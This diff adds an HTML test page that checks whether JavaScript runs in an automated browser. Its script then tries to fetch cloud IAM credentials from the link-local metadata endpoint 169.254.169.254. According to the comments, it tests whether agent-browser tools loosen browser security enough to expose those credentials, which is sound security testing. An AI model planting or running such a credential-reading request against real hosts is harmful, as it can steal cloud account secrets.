@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<head><title>baseline</title></head>
+<body>
+<div id="js-marker">NO_JS</div>
+<div id="imds-result">NO_PROBE</div>
+<script>
+  // Sentinel #1: prove JS executed at all.
+  document.title = 'JS_RAN';
+  document.getElementById('js-marker').textContent = 'JS_RAN_DOM';
+
+  // Sentinel #2: prove (or disprove) that in-page JS can reach link-local IMDS.
+  // Headless Chromium with default settings normally cannot reach 169.254.169.254
+  // from a web origin (browser SOP / mixed-content / loopback rules), but
+  // agent-browser tools sometimes loosen these for automation.
+  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', { cache: 'no-store' })
+    .then(r => r.text())
+    .then(t => { document.getElementById('imds-result').textContent = 'IMDS_OK:' + t; })
+    .catch(e => { document.getElementById('imds-result').textContent = 'IMDS_ERR:' + e.toString(); });
+</script>
+</body>
+</html>
